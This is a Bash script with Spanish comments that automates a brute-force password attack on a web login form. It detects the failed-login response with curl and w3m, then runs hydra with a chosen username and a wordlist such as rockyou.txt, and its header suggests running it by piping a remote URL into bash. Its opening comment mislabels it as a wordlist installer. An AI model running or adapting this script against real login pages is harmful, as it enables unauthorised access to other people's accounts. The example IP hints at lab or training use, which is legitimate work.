#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para instalar la máxima cantidad posible de WordLists en texto plano en Debian
#
# Ejecución remota con parámetros (puede requerir permisos sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | bash -s '10.10.179.150' '/login' 'username' 'password' 'molly' '/home/user/Downloads/rockyou.txt'
#
# Ejecución remota como root (para sistemas sin sudo):
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | sed 's-sudo--g' | bash
#
# Bajar y editar directamente el archivo en nano
#   curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Web/LoginForm/BruteFroce/hydra-POST.sh | nano -
# ----------

# Definir la cantidad de argumentos esperados
  cCantParamEsperados=6

# Comprobar que se hayan pasado la cantidad de parámetros correctos. Abortar el script si no.
  if [ $# -ne $cCantParamEsperados ]
    then
      echo ""
      echo -e "${cColorRojo}  Mal uso del script. El uso correcto sería: ${cFinColor}"
      echo ""
      if [[ "$0" == "bash" ]]; then
        vNombreDelScript="script.sh"
      else
        vNombreDelScript="$0"
      fi
      echo "    $vNombreDelScript [IP] [SubURL] [NombreCampoUsuario] [NombreCampoPassword] [NombreDeUsuarioAIntentar] [UbicDelDiccionarioDePassword]"
      echo ""
      echo "  Ejemplo:"
      echo ""
      echo "    $vNombreDelScript '10.10.179.150' '/login' 'username' 'password' 'molly' '/home/user/Downloads/rockyou.txt'"
      echo ""
      exit
  fi

# Crear variables con los parámetros
  vIP="$1"
  vSubURL="$2"
  vUserField="$3"
  vPassField="$4"
  vUsuario="$5"
  vUbicDicc="$6"

# Determinar el código HTML que devuelve un login fallido
  # Comprobar si el paquete curl está instalado. Si no lo está, instalarlo.
    if [[ $(dpkg-query -s curl 2>/dev/null | grep installed) == "" ]]; then
      echo ""
      echo -e "${cColorRojo}  El paquete curl no está instalado. Iniciando su instalación...${cFinColor}"
      echo ""
      sudo apt-get -y update
      sudo apt-get -y install curl
      echo ""
    fi
  vErrorCode=$(curl -i -s -X POST -d "$vUserField=NiPeGunXXX&$vPassField=NiPeGunXXX"   http://"$vIP""$vSubURL" | grep HTTP | grep Found | cut -d' ' -f2)
  echo ""
  echo "  El código que devuelve la web al introducir credenciales incorrectas es:"
  echo ""
  echo "    $vErrorCode"
  echo ""

# Determinar el texto resultante del error de inicio de sesión
  if [[ "$vErrorCode" =~ ^30[0-9]$ ]]; then # Si hay redirección (30x) -> seguirla con -L y cookie jar
    vJar="$(mktemp)"
    vWebResultanteDespRedir="$(curl -s -L -c "$vJar" -b "$vJar" -H 'Content-Type: application/x-www-form-urlencoded' --data "$vUserField=NiPeGunXXX&$vPassField=NiPeGunXXX" "http://${vIP}${vSubURL}")"
    rm -f "$vJar"
    echo ""
    echo "    La web resultante de seguir la redirección $vErrorCode es esta:"
    echo ""
    echo "$vWebResultanteDespRedir"
    echo ""
    echo "    Renderizada:"
    echo ""
    # Renderizar la web resultante a texto y guardarla en una variable
      # Comprobar si el paquete w3m está instalado. Si no lo está, instalarlo.
        if [[ $(dpkg-query -s w3m 2>/dev/null | grep installed) == "" ]]; then
          echo ""
          echo -e "${cColorRojo}  El paquete w3m no está instalado. Iniciando su instalación...${cFinColor}"
          echo ""
          sudo apt-get -y update
          sudo apt-get -y install w3m
          echo ""
        fi
      vWebRenderizada=$(echo "$vWebResultanteDespRedir" | w3m -T text/html -dump)
    echo "$vWebRenderizada"
    vErrorText=$(echo "$vWebRenderizada" | grep -i -E "incorrect|wrong")
  else
    vErrorText="$(curl -s -X POST -d 'username=NiPeGunXXX&password=NiPeGunXXX'   http://"$vIP""$vSubURL")"
  fi

# Atacar
  echo ""
  echo "  Probando ataque de fuerza bruta..."
  echo ""
  sudo hydra -l "$vUsuario" -P "$vUbicDicc" "$vIP" http-post-form "/login:$vUserField=^USER^&$vPassField=^PASS^:F=$vErrorText"

